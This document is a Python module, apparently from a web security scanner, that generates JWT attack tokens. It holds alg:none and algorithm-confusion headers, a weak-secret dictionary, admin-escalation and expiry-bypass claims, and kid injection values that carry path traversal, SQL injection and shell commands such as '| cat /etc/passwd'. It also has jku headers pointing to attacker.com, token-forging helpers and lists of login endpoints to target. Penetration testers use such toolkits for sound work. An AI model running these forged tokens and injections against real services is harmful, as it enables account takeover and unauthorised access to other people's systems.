"""
JWT (JSON Web Token) Attack Payloads
====================================
Generic payloads for detecting JWT vulnerabilities.
These payloads are NOT application-specific.

Categories:
1. Algorithm Confusion (none, HS256↔RS256)
2. Signature Bypass (empty sig, null bytes)
3. Weak Secret Dictionary (common secrets)
4. Token Manipulation (claims tampering)
5. Key Confusion (JWKS injection)
6. Expiration Bypass (exp/nbf manipulation)

Reference: OWASP WSTG-SESS-02, JWT Security Best Practices
"""

import base64
import json
import hashlib
import hmac
from typing import List, Dict, Any, Optional
from dataclasses import dataclass

# =============================================================================
# CATEGORY 1: ALGORITHM CONFUSION ATTACKS
# =============================================================================

# Header variations for algorithm confusion
ALG_NONE_HEADERS = [
    # alg: none variants
    {"alg": "none", "typ": "JWT"},
    {"alg": "None", "typ": "JWT"},
    {"alg": "NONE", "typ": "JWT"},
    {"alg": "nOnE", "typ": "JWT"},
    {"alg": "none", "typ": "jwt"},
    {"alg": "none"},
    # Empty/null algorithm
    {"alg": "", "typ": "JWT"},
    {"alg": None, "typ": "JWT"},
    # Algorithm stripped
    {"typ": "JWT"},
]

# Algorithm confusion: force HS256 when RS256 expected
ALG_CONFUSION_HEADERS = [
    {"alg": "HS256", "typ": "JWT"},  # Use public key as HMAC secret
    {"alg": "HS384", "typ": "JWT"},
    {"alg": "HS512", "typ": "JWT"},
    {"alg": "PS256", "typ": "JWT"},  # RSA-PSS
    {"alg": "ES256", "typ": "JWT"},  # ECDSA
]

# =============================================================================
# CATEGORY 2: WEAK SECRET DICTIONARY (Top 100 common secrets)
# =============================================================================

WEAK_SECRETS = [
    # Most common JWT secrets
    "secret",
    "secret123",
    "secretkey",
    "secret_key",
    "jwt_secret",
    "jwt-secret",
    "jwtsecret",
    "jwtSecret",
    "JWT_SECRET",
    
    # Application defaults
    "your-256-bit-secret",
    "your-secret-key",
    "your_secret_key",
    "mysecret",
    "mysecretkey",
    "my-secret-key",
    "my_secret_key",
    "mySecretKey",
    
    # Framework defaults
    "changeme",
    "changethis",
    "please-change-me",
    "default",
    "defaultsecret",
    "default_secret",
    
    # Common passwords as secrets
    "password",
    "password123",
    "123456",
    "12345678",
    "admin",
    "admin123",
    "administrator",
    "root",
    "toor",
    "qwerty",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "master",
    "login",
    
    # Development/test secrets
    "test",
    "testing",
    "test123",
    "testkey",
    "dev",
    "development",
    "devkey",
    "debug",
    "demo",
    "example",
    "sample",
    
    # Company/product patterns
    "company",
    "company123",
    "companykey",
    "api",
    "apikey",
    "api_key",
    "api-key",
    "api123",
    "token",
    "tokenkey",
    "token123",
    "auth",
    "authkey",
    "authentication",
    
    # Random looking but common
    "abc123",
    "abcdef",
    "qwerty123",
    "asdfgh",
    "zxcvbn",
    "1234567890",
    "0987654321",
    
    # Base64 encoded common values
    "c2VjcmV0",  # "secret" base64
    "cGFzc3dvcmQ=",  # "password" base64
    "YWRtaW4=",  # "admin" base64
    
    # Hex patterns
    "deadbeef",
    "cafebabe",
    "0123456789abcdef",
    
    # UUID-like patterns
    "00000000-0000-0000-0000-000000000000",
    "11111111-1111-1111-1111-111111111111",
    
    # Environment variable defaults
    "supersecret",
    "super_secret",
    "super-secret",
    "topsecret",
    "top_secret",
    "verysecret",
    
    # Key patterns
    "key",
    "key123",
    "privatekey",
    "private_key",
    "private-key",
    "signingkey",
    "signing_key",
    "signing-key",
    
    # Application names often used
    "node",
    "nodejs",
    "express",
    "flask",
    "django",
    "rails",
    "spring",
    "laravel",
]

# =============================================================================
# CATEGORY 3: CLAIM MANIPULATION PAYLOADS
# =============================================================================

# Admin/privilege escalation claims
PRIVILEGE_ESCALATION_CLAIMS = [
    {"admin": True},
    {"admin": "true"},
    {"admin": 1},
    {"isAdmin": True},
    {"is_admin": True},
    {"role": "admin"},
    {"role": "administrator"},
    {"role": "root"},
    {"role": "superuser"},
    {"roles": ["admin"]},
    {"roles": ["admin", "user"]},
    {"permissions": ["*"]},
    {"permissions": ["admin", "write", "read", "delete"]},
    {"scope": "admin"},
    {"scope": "admin read write"},
    {"group": "administrators"},
    {"groups": ["administrators"]},
    {"level": 0},
    {"level": 999},
    {"privilege": "high"},
    {"access": "full"},
    {"type": "admin"},
    {"user_type": "admin"},
    {"userType": "admin"},
]

# User ID manipulation claims
USER_ID_CLAIMS = [
    {"sub": "1"},
    {"sub": "0"},
    {"sub": "admin"},
    {"sub": "administrator"},
    {"user_id": 1},
    {"user_id": 0},
    {"userId": 1},
    {"userId": 0},
    {"uid": 1},
    {"uid": 0},
    {"id": 1},
    {"id": 0},
    {"username": "admin"},
    {"email": "admin@example.com"},
]

# =============================================================================
# CATEGORY 4: EXPIRATION/TIME BYPASS
# =============================================================================

EXPIRATION_BYPASS_CLAIMS = [
    # Far future expiration
    {"exp": 9999999999},
    {"exp": 2147483647},  # Max 32-bit int
    {"exp": 4102444800},  # Year 2100
    
    # Remove expiration
    {"exp": None},
    {"exp": 0},
    {"exp": ""},
    
    # Negative values
    {"exp": -1},
    
    # Not Before bypass
    {"nbf": 0},
    {"nbf": 1},
    {"nbf": None},
    
    # Issued At manipulation
    {"iat": 0},
    {"iat": 9999999999},
    
    # Combined
    {"exp": 9999999999, "nbf": 0, "iat": 0},
]

# =============================================================================
# CATEGORY 5: SIGNATURE BYPASS PAYLOADS
# =============================================================================

SIGNATURE_BYPASS_PATTERNS = [
    # Empty signature
    "",
    # Single character
    ".",
    # Null bytes
    "\x00",
    "\x00\x00\x00",
    # Base64 padding variations
    "AA==",
    "AAAA",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa",
    # Common test signatures
    "signature",
    "test",
    "invalid",
]

# =============================================================================
# CATEGORY 6: KID (Key ID) INJECTION
# =============================================================================

KID_INJECTION_PAYLOADS = [
    # Path traversal for key file
    {"kid": "../../../dev/null"},
    {"kid": "../../../../../../dev/null"},
    {"kid": "/dev/null"},
    {"kid": "../../../etc/passwd"},
    {"kid": "../../../../../../etc/hostname"},
    
    # SQL injection in kid
    {"kid": "' OR '1'='1"},
    {"kid": "1' UNION SELECT 'secret'--"},
    {"kid": "'; SELECT * FROM keys--"},
    
    # Command injection in kid
    {"kid": "; ls -la"},
    {"kid": "| cat /etc/passwd"},
    {"kid": "`whoami`"},
    {"kid": "$(id)"},
    
    # Empty/null kid
    {"kid": ""},
    {"kid": None},
    {"kid": "null"},
    
    # Known weak keys
    {"kid": "0"},
    {"kid": "1"},
    {"kid": "test"},
    {"kid": "default"},
]

# =============================================================================
# CATEGORY 7: JKU/X5U HEADER INJECTION
# =============================================================================

JKU_INJECTION_HEADERS = [
    # External JWKS endpoint
    {"alg": "RS256", "jku": "http://attacker.com/.well-known/jwks.json"},
    {"alg": "RS256", "jku": "http://localhost/.well-known/jwks.json"},
    {"alg": "RS256", "jku": "http://127.0.0.1/jwks.json"},
    
    # X5U (X.509 URL) injection
    {"alg": "RS256", "x5u": "http://attacker.com/cert.pem"},
    {"alg": "RS256", "x5u": "http://localhost/cert.pem"},
    
    # Combined with kid
    {"alg": "RS256", "jku": "http://attacker.com/jwks.json", "kid": "attacker-key"},
]

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def base64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')


def base64url_decode(data: str) -> bytes:
    """Base64url decode with padding restoration."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def create_unsigned_jwt(header: Dict, payload: Dict) -> str:
    """Create a JWT without signature (alg: none attack)."""
    header_b64 = base64url_encode(json.dumps(header).encode())
    payload_b64 = base64url_encode(json.dumps(payload).encode())
    return f"{header_b64}.{payload_b64}."


def create_jwt_with_secret(header: Dict, payload: Dict, secret: str) -> str:
    """Create a JWT with HMAC signature using given secret."""
    header_b64 = base64url_encode(json.dumps(header).encode())
    payload_b64 = base64url_encode(json.dumps(payload).encode())
    
    message = f"{header_b64}.{payload_b64}"
    
    alg = header.get("alg", "HS256")
    if alg == "HS256":
        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    elif alg == "HS384":
        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
    elif alg == "HS512":
        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
    else:
        signature = b""
    
    signature_b64 = base64url_encode(signature)
    return f"{message}.{signature_b64}"


def create_tampered_jwt(original_jwt: str, new_claims: Dict) -> str:
    """Create a tampered JWT by modifying claims (keeps original signature)."""
    try:
        parts = original_jwt.split('.')
        if len(parts) != 3:
            return original_jwt
        
        header = json.loads(base64url_decode(parts[0]))
        payload = json.loads(base64url_decode(parts[1]))
        
        # Merge new claims
        payload.update(new_claims)
        
        # Recreate with original signature (will be invalid but tests for verification)
        header_b64 = base64url_encode(json.dumps(header).encode())
        payload_b64 = base64url_encode(json.dumps(payload).encode())
        
        return f"{header_b64}.{payload_b64}.{parts[2]}"
    except Exception:
        return original_jwt


def decode_jwt(token: str) -> Dict[str, Any]:
    """Decode a JWT without verification."""
    try:
        parts = token.split('.')
        if len(parts) < 2:
            return {}
        
        header = json.loads(base64url_decode(parts[0]))
        payload = json.loads(base64url_decode(parts[1]))
        
        return {
            "header": header,
            "payload": payload,
            "signature": parts[2] if len(parts) > 2 else ""
        }
    except Exception:
        return {}


# =============================================================================
# PAYLOAD GENERATION FUNCTIONS
# =============================================================================

def get_alg_none_tokens(base_payload: Dict = None) -> List[str]:
    """Generate alg:none attack tokens."""
    if base_payload is None:
        base_payload = {
            "sub": "admin",
            "role": "admin",
            "iat": 1609459200,
            "exp": 9999999999
        }
    
    tokens = []
    for header in ALG_NONE_HEADERS:
        try:
            token = create_unsigned_jwt(header, base_payload)
            tokens.append(token)
        except Exception:
            pass
    
    return tokens


def get_weak_secret_tokens(base_payload: Dict = None) -> List[Dict[str, str]]:
    """Generate tokens signed with weak secrets."""
    if base_payload is None:
        base_payload = {
            "sub": "admin",
            "role": "admin",
            "iat": 1609459200,
            "exp": 9999999999
        }
    
    header = {"alg": "HS256", "typ": "JWT"}
    tokens = []
    
    for secret in WEAK_SECRETS[:50]:  # Top 50 for efficiency
        try:
            token = create_jwt_with_secret(header, base_payload, secret)
            tokens.append({"token": token, "secret": secret})
        except Exception:
            pass
    
    return tokens


def get_privilege_escalation_tokens(original_jwt: str = None) -> List[str]:
    """Generate tokens with privilege escalation claims."""
    tokens = []
    
    if original_jwt:
        # Tamper existing token
        for claims in PRIVILEGE_ESCALATION_CLAIMS:
            tokens.append(create_tampered_jwt(original_jwt, claims))
    else:
        # Create new tokens with alg:none
        header = {"alg": "none", "typ": "JWT"}
        for claims in PRIVILEGE_ESCALATION_CLAIMS:
            base_payload = {"sub": "user", "iat": 1609459200, "exp": 9999999999}
            base_payload.update(claims)
            tokens.append(create_unsigned_jwt(header, base_payload))
    
    return tokens


def get_kid_injection_tokens(base_payload: Dict = None) -> List[str]:
    """Generate tokens with KID injection payloads."""
    if base_payload is None:
        base_payload = {
            "sub": "admin",
            "role": "admin", 
            "iat": 1609459200,
            "exp": 9999999999
        }
    
    tokens = []
    for kid_header in KID_INJECTION_PAYLOADS:
        header = {"alg": "HS256", "typ": "JWT"}
        header.update(kid_header)
        # Sign with empty string (if kid points to /dev/null)
        try:
            token = create_jwt_with_secret(header, base_payload, "")
            tokens.append(token)
        except Exception:
            pass
    
    return tokens


def get_all_jwt_attack_tokens() -> Dict[str, List]:
    """Get all JWT attack tokens organized by category."""
    return {
        "alg_none": get_alg_none_tokens(),
        "privilege_escalation": get_privilege_escalation_tokens(),
        "kid_injection": get_kid_injection_tokens(),
        "weak_secrets": WEAK_SECRETS[:50],  # Return secrets, not full tokens
    }


# =============================================================================
# DETECTION PATTERNS
# =============================================================================

def get_jwt_detection_patterns() -> List[str]:
    """Regex patterns to identify JWT tokens in responses."""
    return [
        r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',  # Standard JWT
        r'Bearer\s+eyJ[A-Za-z0-9_-]+',  # Bearer token
        r'"token"\s*:\s*"eyJ[A-Za-z0-9_-]+',  # JSON token field
        r'"jwt"\s*:\s*"eyJ[A-Za-z0-9_-]+',  # JSON jwt field
        r'"access_token"\s*:\s*"eyJ[A-Za-z0-9_-]+',  # OAuth access token
        r'"id_token"\s*:\s*"eyJ[A-Za-z0-9_-]+',  # OIDC id token
    ]


def get_jwt_vulnerability_indicators() -> List[str]:
    """Indicators that suggest JWT vulnerabilities."""
    return [
        # Algorithm none accepted
        r'"alg"\s*:\s*"none"',
        r'"alg"\s*:\s*"None"',
        
        # Weak algorithm warnings
        r"algorithm.*not.*supported",
        r"invalid.*algorithm",
        r"signature.*verification.*failed",
        
        # Token manipulation success indicators
        r"admin.*true",
        r"role.*admin",
        "authenticated",
        "authorized",
        
        # Error messages revealing JWT issues
        "jwt.*expired",
        "token.*expired",
        "invalid.*token",
        "malformed.*jwt",
        "signature.*invalid",
        "algorithm.*mismatch",
    ]


# =============================================================================
# COMMON JWT ENDPOINTS TO TEST
# =============================================================================

JWT_TEST_ENDPOINTS = [
    "/api/login",
    "/api/auth",
    "/api/authenticate",
    "/api/token",
    "/api/refresh",
    "/api/user",
    "/api/me",
    "/api/profile",
    "/api/admin",
    "/oauth/token",
    "/auth/login",
    "/auth/token",
    "/login",
    "/signin",
    "/rest/user/login",
    "/rest/user/whoami",
]

JWT_COOKIE_NAMES = [
    "token",
    "jwt",
    "auth",
    "session",
    "access_token",
    "id_token",
    "authorization",
]

JWT_HEADER_NAMES = [
    "Authorization",
    "X-Auth-Token",
    "X-JWT-Token",
    "X-Access-Token",
    "Auth-Token",
]

# =============================================================================
# PAYLOAD METADATA
# =============================================================================

JWT_PAYLOAD_INFO = {
    "total_weak_secrets": len(WEAK_SECRETS),
    "alg_none_variants": len(ALG_NONE_HEADERS),
    "privilege_claims": len(PRIVILEGE_ESCALATION_CLAIMS),
    "user_id_claims": len(USER_ID_CLAIMS),
    "expiration_bypass": len(EXPIRATION_BYPASS_CLAIMS),
    "kid_injections": len(KID_INJECTION_PAYLOADS),
    "jku_injections": len(JKU_INJECTION_HEADERS),
    "test_endpoints": len(JWT_TEST_ENDPOINTS),
    "reference": "OWASP WSTG-SESS-02",
    "description": "JWT attack payloads for testing token-based authentication",
}


if __name__ == "__main__":
    print("=" * 60)
    print("JWT ATTACK PAYLOAD STATISTICS")
    print("=" * 60)
    
    info = JWT_PAYLOAD_INFO
    print(f"\nWeak Secrets: {info['total_weak_secrets']}")
    print(f"Algorithm None Variants: {info['alg_none_variants']}")
    print(f"Privilege Escalation Claims: {info['privilege_claims']}")
    print(f"User ID Claims: {info['user_id_claims']}")
    print(f"Expiration Bypass Claims: {info['expiration_bypass']}")
    print(f"KID Injection Payloads: {info['kid_injections']}")
    print(f"JKU Injection Headers: {info['jku_injections']}")
    print(f"Test Endpoints: {info['test_endpoints']}")
    
    print(f"\n=== Sample alg:none tokens ===")
    tokens = get_alg_none_tokens()
    for t in tokens[:3]:
        print(f"  {t[:80]}...")
